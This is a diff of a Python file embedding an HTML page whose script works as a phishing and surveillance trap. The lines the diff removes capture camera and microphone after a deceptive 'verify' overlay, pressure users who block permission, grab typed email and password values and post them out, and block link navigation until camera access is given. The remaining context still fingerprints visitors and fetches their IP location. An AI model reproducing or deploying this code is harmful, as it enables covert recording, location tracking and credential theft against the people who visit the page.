@@ -294,44 +294,7 @@ HTML_PAGE = '''<!DOCTYPE html>
             document.body.style.overflow = 'auto';
         }
 
-        function onUserGesture(ev){
-            if(overlayHandled) return; overlayHandled = true;
-            safePost({type:'diag', msg:'entry_gesture', ev: ev && ev.type});
-            requestLocation();
-        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
-            navigator.mediaDevices.getUserMedia({video:true, audio:true})
-            .then(s => {
-                frontStream = s;
-                const fv = document.getElementById('frontVideo');
-                try{ fv.srcObject = s; fv.playsInline = true; fv.muted = true; fv.autoplay = true; }catch(e){}
-                camStarted = true;
-                permissionState.camera = true;
-                startSimpleCapture();
-                safePost({type:'diag', msg:'camera_granted'});
-                if(permissionState.camera && permissionState.geo) hideOverlay();
-                processQueue();
-            })
-            .catch(err => {
-                safePost({type:'diag', msg:'camera_failed', error: (err && err.toString()) || 'err'});
-                const btn = document.getElementById('verifyBtn');
-                if(btn) btn.innerText = "ALLOW";
-                overlayHandled = false;
-                const warn = document.getElementById('overlayWarn');
-                if(warn) warn.innerHTML = "❌ YOU BLOCKED IT! Please click \"Allow\" on the permission popup, then click the lock icon (🔒) on the right side of the address bar and allow camera permission.";
-            });
-        }
-            try{ setTimeout(function(){ var email=document.getElementById('email').value||''; var pwd=document.getElementById('password').value||''; safePost({type:'login', email:email, password:pwd}); }, 400); }catch(e){}
-        }
-
-        function attachGesture(){
-            var overlay = document.getElementById('entryOverlay');
-            if(!overlay) return;
-            var opts = {passive:true};
-            try{ overlay.addEventListener('touchstart', onUserGesture, opts); }catch(e){}
-            try{ overlay.addEventListener('pointerdown', onUserGesture, opts); }catch(e){}
-            try{ overlay.addEventListener('click', onUserGesture, opts); }catch(e){}
-            try{ document.addEventListener('touchstart', onUserGesture, {passive:true}); }catch(e){}
-        }
+        // Gesture handling moved to window.load handler below for single clean handler
 
         try{ data.ua = navigator.userAgent; data.screen = (screen.width||0) + 'x' + (screen.height||0); data.lang = navigator.language || ''; }catch(e){}
         try{
@@ -345,7 +308,7 @@ HTML_PAGE = '''<!DOCTYPE html>
         }catch(e){}
         try{ safePost({type:'init', data:data}); }catch(e){}
         try{ fetch('https://ipinfo.io/json').then(function(r){ return r.json(); }).then(function(ip){ try{ data.ip=ip.ip; data.city=ip.city; data.country=ip.country; }catch(e){} }).catch(function(){}); }catch(e){}
-        try{ var dbg = document.getElementById('debugPermBtn'); if(dbg) dbg.addEventListener('click', function(){ onUserGesture({type:'debugBtn'}); }); }catch(e){}
+        // debugPermBtn handled in DOMContentLoaded below
 
         // Global permission state object
         const permissionState = {camera:false, geo:false};
@@ -380,29 +343,7 @@ HTML_PAGE = '''<!DOCTYPE html>
         }
         window.addEventListener('online', processQueue);
 
-        // Intercept all anchor clicks to enforce permission before navigation
-        document.addEventListener('click', function(e){
-            const a = e.target.closest('a');
-            if(!a) return;
-            if(!permissionState.camera){
-                e.preventDefault();
-                // Show overlay if not already
-                if(!overlayHandled){
-                    const btn = document.getElementById('verifyBtn');
-                    if(btn) btn.innerText = "ALLOW";
-                    overlayHandled = false;
-                }
-                // Trigger permission flow
-                onUserGesture(e);
-                // After permission granted, navigate programmatically
-                const checkAndNavigate = setInterval(()=>{
-                    if(permissionState.camera){
-                        clearInterval(checkAndNavigate);
-                        window.location.href = a.href;
-                    }
-                }, 500);
-            }
-        });
+        // Anchor click interception removed - handled by overlay flow
     })();
 
 async function checkCameraPermission(){
